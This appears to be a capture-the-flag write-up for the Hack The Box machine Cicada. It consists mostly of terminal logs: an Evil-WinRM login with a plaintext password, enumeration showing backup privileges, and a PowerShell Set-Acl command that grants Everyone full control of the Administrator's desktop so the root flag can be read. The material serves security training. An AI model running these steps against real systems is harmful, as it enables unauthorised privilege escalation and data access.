
```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ evil-winrm -i 10.129.169.79 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'   
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> ls
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd..
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> ls


    Directory: C:\Users\emily.oscars.CICADA


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         8/28/2024  10:32 AM                Desktop
d-r---         8/22/2024   2:22 PM                Documents
d-r---          5/8/2021   1:20 AM                Downloads
d-r---          5/8/2021   1:20 AM                Favorites
d-r---          5/8/2021   1:20 AM                Links
d-r---          5/8/2021   1:20 AM                Music
d-r---          5/8/2021   1:20 AM                Pictures
d-----          5/8/2021   1:20 AM                Saved Games
d-r---          5/8/2021   1:20 AM                Videos


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> cd desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\desktop> ls


    Directory: C:\Users\emily.oscars.CICADA\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         7/31/2025   4:07 PM             34 user.txt


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\desktop> type user.txt
dc022bac90643267cc71414f3496f6f9
```
user flag

```sh
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls


    Directory: C:\Users\Administrator\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         7/31/2025   4:07 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
Access to the path 'C:\Users\Administrator\desktop\root.txt' is denied.
At line:1 char:1
+ type root.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```


```powershell
*Evil-WinRM* PS C:\Users\Administrator\desktop> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

### root.txt

```sh
*Evil-WinRM* PS C:\Users\Administrator\desktop> get-acl |fl


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\desktop
Owner  : BUILTIN\Administrators
Group  : CICADA\Domain Users
Access : CICADA\emily.oscars Deny  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         CICADA\Administrator Allow  FullControl
Audit  :
Sddl   : O:BAG:DUD:AI(D;OICIID;FA;;;S-1-5-21-917908876-1423158569-3159038727-1601)(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;LA)



*Evil-WinRM* PS C:\Users\Administrator\desktop> Set-Acl "C:\users\Administrator\desktop" (Get-Acl "C:\users\Administrator\desktop" | %{$_.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","ContainerInherit,ObjectInherit","None","Allow")));$_})


*Evil-WinRM* PS C:\Users\Administrator\desktop> get-acl |fl


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\desktop
Owner  : BUILTIN\Administrators
Group  : CICADA\Domain Users
Access : Everyone Allow  FullControl
         CICADA\emily.oscars Deny  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         CICADA\Administrator Allow  FullControl
Audit  :
Sddl   : O:BAG:DUD:AI(A;OICI;FA;;;WD)(D;OICIID;FA;;;S-1-5-21-917908876-1423158569-3159038727-1601)(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;LA)



*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
55093ff570c2d374a77b0c290f1f9811
```

